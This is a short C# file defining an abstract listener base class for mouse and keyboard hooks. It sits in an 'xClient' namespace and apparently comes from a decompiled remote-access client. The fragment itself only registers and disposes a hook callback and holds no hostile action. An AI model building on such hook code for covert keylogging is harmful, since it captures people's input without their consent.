using System;
using xClient.Core.MouseKeyHook.WinApi;

namespace xClient.Core.MouseKeyHook.Implementation;

internal abstract class BaseListener : IDisposable
{
	protected HookResult Handle { get; set; }

	protected BaseListener(Delegate1 subscribe)
	{
		Handle = subscribe(Callback);
	}

	public void Dispose()
	{
		Handle.Dispose();
	}

	protected abstract bool Callback(Struct1 data);
}
